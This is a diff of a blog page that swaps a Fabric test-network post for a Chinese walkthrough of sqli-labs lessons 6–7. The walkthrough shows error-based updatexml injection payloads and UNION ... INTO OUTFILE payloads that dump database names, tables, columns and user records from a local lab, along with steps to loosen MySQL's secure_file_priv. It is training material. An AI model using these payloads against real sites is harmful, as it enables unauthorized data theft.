@@ -4,11 +4,13 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="fabric2.2 test-network测试网络, 是小竹不是小猪">
-    <meta name="description" content="fabric2.2 test-network测试网络./network.sh up
+    <meta name="keywords" content="是小竹不是小猪">
+    <meta name="description" content="title: sql-lib less6-7date: 2022-02-27 14:37:42tags:
+less6- ”闭合报错注入步骤一：sqlmap进行扫描
 
-该命令创建两个对等节点和一个排序节点组成的Fabric网络。
-3.3 在通道启动一个链码使用network.sh创建通道后，你可以使用以下命令在通道上启动">
+由结果可以得知注入形式为双引号闭合，并且可以使用报错注入。
+爆数据库名称
+">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -20,7 +22,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>fabric2.2 test-network测试网络 | 是小竹不是小猪</title>
+    <title>是小竹不是小猪</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -312,12 +314,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">fabric2.2 test-network测试网络</h1>
+                    <h1 class="description center-align post-title"></h1>
                 </div>
             </div>
         </div>
@@ -445,7 +447,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-01-20
+                    2022-02-27
                 </div>
                 
 
@@ -466,23 +468,83 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="fabric2-2-test-network测试网络"><a href="#fabric2-2-test-network测试网络" class="headerlink" title="fabric2.2 test-network测试网络"></a>fabric2.2 test-network测试网络</h1><pre><code class="shell">./network.sh up
+                <p>title: sql-lib less6-7<br>date: 2022-02-27 14:37:42<br>tags:</p>
+<h2 id="less6-”闭合报错注入"><a href="#less6-”闭合报错注入" class="headerlink" title="less6- ”闭合报错注入"></a>less6- ”闭合报错注入</h2><p>步骤一：sqlmap进行扫描</p>
+<p><img src="/2022/02/27/0227/1.PNG" alt="1"></p>
+<p>由结果可以得知注入形式为双引号闭合，并且可以使用报错注入。</p>
+<p>爆数据库名称</p>
+<pre><code class="sql">id=-1&quot; and updatexml(1,concat(0x7e,database(),0x7e),1)
 </code></pre>
-<p>该命令创建两个对等节点和一个排序节点组成的Fabric网络。</p>
-<p>3.3 在通道启动一个链码<br>使用network.sh创建通道后，你可以使用以下命令在通道上启动链码：</p>
-<p>sudo ./network.sh deployCC</p>
-<p>注意！！！<br>可能出现的问题1<br>执行上面的命令后可能会出现找不到go命令的错误，这是因为sudo命令会重置当前的环境变量，导致go命令找不到。聪明的人可能会想到不加sudo命令，然后运行后你会发现提示权限不够。</p>
-<p>Error: failed to normalize chaincode path: failed to determine module root: exec: “go”: executable file not found in $PATH<br>1<br>解决方法如下：</p>
-<p>vim ~/.bashrc</p>
-<p>开头或末尾添加</p>
-<p>alias sudo=’sudo env PATH=$PATH LD_LIBRARY_PATH=$LD_LIBRARY_PATH’</p>
-<p>保存退出</p>
-<p>重置环境配置</p>
-<p>source ~/.bashrc</p>
-<p>可能出现的问题2<br>执行上面的命令后可能会出现以下错误：</p>
-<p>Error: failed to normalize chaincode path: ‘go list’ failed with: go: github.com/golang/<a href="mailto:&#112;&#x72;&#111;&#x74;&#111;&#98;&#117;&#x66;&#64;&#x76;&#49;&#x2e;&#51;&#46;&#x32;">&#112;&#x72;&#111;&#x74;&#111;&#98;&#117;&#x66;&#64;&#x76;&#49;&#x2e;&#51;&#46;&#x32;</a>: Get “<a target="_blank" rel="noopener" href="https://proxy.golang.org/github.com/golang/protobuf/@v/v1.3.2.mod&quot;">https://proxy.golang.org/github.com/golang/protobuf/@v/v1.3.2.mod&quot;</a>: dial tcp 216.58.200.49:443: connect: connection refused: exit status 1<br>1<br>看错误提示可以看到它是访问golang的官网<a target="_blank" rel="noopener" href="https://proxy.golang.org,这是外网,自然报错./">https://proxy.golang.org，这是外网，自然报错。</a><br>解决方法如下：</p>
-<p>在命令行直接运行</p>
-<p>go env -w GO111MODULE=on<br>go env -w GOPROXY=<a target="_blank" rel="noopener" href="https://goproxy.cn,direct/">https://goproxy.cn,direct</a></p>
+<p><img src="/2022/02/27/0227/2.PNG" alt="2"></p>
+<p>爆表名</p>
+<pre><code class="sql">1&quot; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+
+</code></pre>
+<p><img src="/2022/02/27/0227/3.PNG" alt="3"></p>
+<p>爆字段名</p>
+<pre><code class="sql">http://localhost/sqil/Less-6/?id=1&quot; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),0x7e),1) --+--+table_name=‘users’),0x7e),1) --+
+</code></pre>
+<p><img src="/2022/02/27/0227/4.PNG" alt="4"></p>
+<p>爆数据</p>
+<pre><code class="sql">1&quot;  and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)%23 
+</code></pre>
+<p><img src="/2022/02/27/0227/5.PNG" alt="5"></p>
+<h2 id="less7–文件读写注入"><a href="#less7–文件读写注入" class="headerlink" title="less7–文件读写注入"></a>less7–文件读写注入</h2><p>利用sqlmap进行扫描</p>
+<p><img src="/2022/02/27/0227/6.PNG" alt="6"></p>
+<p><img src="C:/Users/bamboo/AppData/Roaming/Typora/typora-user-images/image-20220227150404246.png" alt="image-20220227150404246"></p>
+<p>发现闭合语句提示id=’) ,但是在尝试的时候发现不能完成闭合，于是尝试了id=’))可以完成。</p>
+<p><img src="/2022/02/27/0227/8.PNG" alt="8"></p>
+<p><img src="/2022/02/27/0227/9.PNG" alt="9"></p>
+<p>证明是否有写入权限：返回正常说明有。</p>
+<pre><code class="sql">http://localhost/sqil/Less-7/?id=1&#39;)) and (select count(*) from mysql.user)&gt;0 --+
+</code></pre>
+<p><img src="/2022/02/27/0227/10.PNG" alt="10"></p>
+<p>证明有3列</p>
+<pre><code class="sql">http://localhost/sqil/Less-7/?id=1&#39;)) order by 4 --+  
+</code></pre>
+<p><img src="/2022/02/27/0227/11.PNG" alt="11"></p>
+<p>使用下列语句尝试导出</p>
+<pre><code class="sql">http://localhost:80/sqils/Less-7/?id=1&#39;)) union select * from users into outfile &quot;D:\\1.txt&quot;--+
+</code></pre>
+<p>如果发现在该路径下面未出现相关文件，则进行以下操作：</p>
+<p>一、检查权限</p>
+<p>若使用下面方法发现显示正常则权限为root合适，进行下一步。</p>
+<pre><code class="sql">http://localhost:80/sqil/Less-7/?id=1&#39;)) and (select count(*) from mysql.user)&gt;0--+
+</code></pre>
+<p>二、需要在指定目录下进行导出</p>
+<p>在mysql的bin文件夹下打开终端输入以下命令，打开mysql命令行。</p>
+<pre><code>mysql -u root -p
+</code></pre>
+<p>输入以下命令检查权限。</p>
+<pre><code class="shell">show variables like &#39;%secure%&#39;
+</code></pre>
+<p><img src="/2022/02/27/0227/14.PNG" alt="14"></p>
+<p>观察secure_file_priv参数，如果是一个路径那么，只能在该路径下导出。</p>
+<p>如果是空，则没有限制，如果是NULL则不允许导出。</p>
+<p>打开Mysql下载文件夹，打开my.ini文件，查找secure_file_priv配置，如果存在则进行修改，如果不存在，则在[mysqld]下加入 secure_file_priv = “F:/data”</p>
+<p><img src="/2022/02/27/0227/19.PNG" alt="19"></p>
+<p><img src="/2022/02/27/0227/20.PNG" alt="20"></p>
+<p>关闭mysql服务并再次重启，查看secure_file_priv，发现改动生效。</p>
+<p><img src="/2022/02/27/0227/13.PNG" alt="13"></p>
+<p>直接使用该路径进行导出，获得数据。</p>
+<p><img src="/2022/02/27/0227/15.PNG" alt="15"></p>
+<p><img src="/2022/02/27/0227/16.PNG" alt="16"></p>
+<p><img src="/2022/02/27/0227/17.PNG" alt="17"></p>
+<pre><code class="sql">
+
+#字段数
+
+http://localhost/sqil/Less-7/?id=1&#39;)) union select 1,2,3 into outfile &quot;F:\\data\\1.txt&quot; --+
+#数据库名称
+http://localhost/sqil/Less-7/?id=1&#39;)) union select 1,user(),database() into outfile &quot;F:\\data\\2.txt&quot; --+
+#爆表名
+http://localhost/sqil/Less-7/?id=1&#39;)) union select 1,2,table_name from information_schema.tables where table_schema=&#39;security&#39; into outfile &quot;F:\\data\\3.txt&quot;--+
+#爆字段名
+http://localhost/sqil/Less-7/?id=1&#39;)) union select 1,2,column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; into outfile &quot;F:\\data\\4.txt&quot;--+
+#爆数据
+http://localhost/sqil/Less-7/?id=1&#39;)) union select * from users into outfile &quot;F:\\data\\5.txt&quot;--+
+</code></pre>
+<p>参考链接</p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/7b9256de20d1">https://www.jianshu.com/p/7b9256de20d1</a></p>
 
                 
             </div>
@@ -509,7 +571,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/01/20/a0120/">http://example.com/2022/01/20/a0120/</a>
+                    <a href="http://example.com/2022/02/27/0227/">http://example.com/2022/02/27/0227/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -716,54 +778,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/01/20/a0121/">
+                <a href="/2022/02/27/0227/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="SQli-lab test1">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
                         
-                        <span class="card-title">SQli-lab test1</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-01-20
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            小竹
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/12/09/vue/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="vue3-摄影平台">
-                        
-                        <span class="card-title">vue3-摄影平台</span>
+                        <span class="card-title"></span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -774,7 +800,45 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-12-09
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-02-27
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            小竹
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/02/26/0226/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="sqil-lab less2-5">
+                        
+                        <span class="card-title">sqil-lab less2-5</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-02-26
                             </span>
                         <span class="publish-author">
                             
